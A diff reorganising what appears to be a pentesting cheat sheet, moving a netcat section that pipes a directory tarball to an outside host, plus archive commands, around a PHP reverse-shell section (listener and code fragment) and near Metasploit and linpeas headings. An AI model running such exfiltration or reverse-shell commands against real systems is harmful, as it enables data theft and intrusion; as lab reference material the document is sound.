@@ -47,27 +47,6 @@ set payload <payload_name>
 exploit
 ```
 
-## Send directory with `netcat`
-### Sender:
-```bash
-tar -czf directory.tar.gz ./directory
-cat directory.tar.gz | nc example.com 1234
-```
-### Receiver:
-```bash
-nc -l -p 1234 > directory.tar.gz
-```
-
-# Archive
-### Compress:
-```bash
-tar -czvf archive.tar.gz /path/to/directory_or_file
-```
-### Extract:
-```bash
-tar -xzvf archive.tar.gz -C /path/to/extract
-```
-
 ## PHP reverse shell
 ```bash
 nc -lvnp 4444
@@ -91,6 +70,27 @@ if ($socket) {
     fclose($socket);
 }
 ?>
+```
+
+## Send directory with `netcat`
+### Sender:
+```bash
+tar -czf directory.tar.gz ./directory
+cat directory.tar.gz | nc example.com 1234
+```
+### Receiver:
+```bash
+nc -l -p 1234 > directory.tar.gz
+```
+
+## Archive
+### Compress:
+```bash
+tar -czvf archive.tar.gz /path/to/directory_or_file
+```
+### Extract:
+```bash
+tar -xzvf archive.tar.gz -C /path/to/extract
 ```
 
 ## Download and serve `linpeas`
